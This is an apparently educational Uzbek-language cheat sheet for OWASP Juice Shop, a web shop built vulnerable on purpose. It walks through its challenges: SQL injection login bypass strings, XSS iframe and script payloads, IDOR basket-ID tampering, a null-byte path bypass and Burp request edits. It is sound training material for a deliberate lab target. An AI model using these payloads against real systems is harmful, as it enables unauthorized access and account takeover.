# 🧃 OWASP Juice Shop

> **Maqsad:** Ataylab zaif qilingan veb-ilova — OWASP Top 10 zaifliklarini amalda o'rganish.

---

## 📖 Juice Shop nima?

**OWASP Juice Shop** — o'rganish maqsadida yaratilgan zaif veb-ilova. Real do'kon ko'rinishida bo'lib, ichida ataylab ko'plab zaifliklar joylashtirilgan.

```
Texnologiyalar:
- Frontend: Angular (JavaScript framework)
- Backend: Node.js + Express
- Baza: SQLite
- API: REST
```

---

## 🎯 Asosiy Zaiflik Kategoriyalari

### 1. 🔍 Reconnaissance (Razvedka)
```
# Manba kodini o'rganish:
F12 → Sources → main.js
# "minified" → {} tugmasi bilan chiroyli ko'rish
# /api/ endpoint larni qidirish
# yashirin sahifalar, admin panel

# robots.txt tekshirish:
/robots.txt

# Score Board ni topish (yashirin sahifa):
/#/score-board
```

### 2. 🔐 Injection (Kiritish)
```sql
-- Login SQL Injection:
Email:    ' OR 1=1--
Password: (ixtiyoriy)

-- Foydalanuvchi:
Email:    admin@juice-sh.op'--
Password: (ixtiyoriy)
```

### 3. 🔑 Broken Authentication (Buzilgan Autentifikatsiya)
```
# Admin akkauntiga kirish:
Email:    admin@juice-sh.op
SQL bypass: ' OR 1=1--

# Parolni reset qilish zaiflik:
Forgot Password → Xavfsizlik savoli zaif
```

### 4. 🆔 Broken Access Control (Buzilgan Kirish Nazorati)
```
# Boshqa foydalanuvchi savatiga kirish:
GET /rest/basket/1    → o'z savat
GET /rest/basket/2    → boshqa savat → IDOR!

# Admin panelga kirish:
/#/administration
```

### 5. 💻 XSS (Cross-Site Scripting)
```html
<!-- Qidiruv maydonida: -->
<iframe src="javascript:alert('xss')">

<!-- Mahsulot izohida: -->
<script>alert('XSS')</script>
```

### 6. 📁 Sensitive Data Exposure (Maxfiy Ma'lumot Oshkor)
```
# FTP papkasiga kirish:
/ftp/

# Backup fayllar:
/ftp/package.json.bak
/ftp/eastere.gg

# API xatolari orqali ma'lumot:
# 500 xato javobida stack trace ko'rinishi
```

### 7. 🔄 Security Misconfiguration (Xavfsizlik Noto'g'ri Sozlash)
```
# Xato xabarlar orqali ma'lumot olish
# Keraksiz HTTP headerlar
# Default konfiguratsiyalar
```

---

## 🛠️ Juice Shop API Endpoint lari

```
GET  /api/Products          → Mahsulotlar ro'yxati
GET  /api/Products/:id      → Mahsulot (IDOR!)
GET  /rest/basket/:id       → Savat (IDOR!)
POST /api/Users             → Ro'yxatdan o'tish
POST /rest/user/login       → Kirish
GET  /rest/user/whoami      → Kim ekanligim
GET  /api/Feedbacks         → Izohlar
POST /api/Feedbacks         → Izoh qo'shish (XSS!)
GET  /rest/products/search?q= → Qidirish (SQLi!)
```

---

## 🎯 Amaliy Misollar: Asosiy Challengelar

### Challenge 1: Score Board Topish
```
1. F12 → Sources → main.js → {} format
2. "score-board" qidiring
3. /#/score-board ga o'ting
→ Barcha challengelar ro'yxati!
```

### Challenge 2: Admin sifatida Login
```
1. /# → Login sahifasi
2. Email: ' OR 1=1--
3. Password: ixtiyoriy
→ Birinchi foydalanuvchi (admin) sifatida kirish!

# Yoki aniq admin:
Email: admin@juice-sh.op'--
```

### Challenge 3: Boshqa Foydalanuvchi Savatiga Kirish
```
1. Login qiling
2. O'z savatingizdagi so'rovni Burp da ko'ring:
   GET /rest/basket/6
3. ID ni o'zgartiring:
   GET /rest/basket/1  → Admin savati!
```

### Challenge 4: FTP Papkasiga Kirish
```
1. /ftp/ ga o'ting
2. Fayllarni ko'ring:
   /ftp/package.json.bak
   /ftp/acquisitions.md
3. Null byte bypass (agar kerak):
   /ftp/coupons_2013.md.bak%2500.md
```

### Challenge 5: Mahsulotga XSS
```
1. Mahsulot izohiga:
   <iframe src="javascript:alert(`xss`)">
2. Yuboring → Alert chiqsa → XSS!
```

### Challenge 6: Admin Panelni Topish
```
1. F12 → Sources → main.js
2. "admin" qidiring
3. /#/administration ga o'ting
(Login bo'lgan holda)
```

---

## 🔧 Burp Suite bilan Juice Shop

```
1. Burp → Proxy → Intercept ON
2. Juice Shop da harakatlar qiling
3. So'rovlarni Burp da ko'ring va tahrirlang:

# Savat ID ni o'zgartirish:
GET /rest/basket/1 → GET /rest/basket/2

# Izoh HTML ni o'zgartirish:
POST /api/Feedbacks
{"comment": "<script>alert(1)</script>", "rating": 5}

# Qidiruv SQLi:
GET /rest/products/search?q=apple'
```

---

## 💡 Eslab Qolish Uchun

| Zaiflik | Qayerda | Payload |
|---------|---------|---------|
| **SQLi** | Login, qidirish | `' OR 1=1--` |
| **XSS** | Izoh, qidiruv | `<iframe src="javascript:alert('xss')">` |
| **IDOR** | Savat, profil | ID ni o'zgartirish |
| **Path Traversal** | FTP | `/ftp/secret.md` |
| **Info Disclosure** | main.js, /ftp/ | Manba kodi, fayllar |

**Boshlash tartibi:**
1. Score Board topish → `/#/score-board`
2. Admin login → SQL bypass
3. API endpoint larni o'rganing
4. IDOR, XSS, SQLi sinang
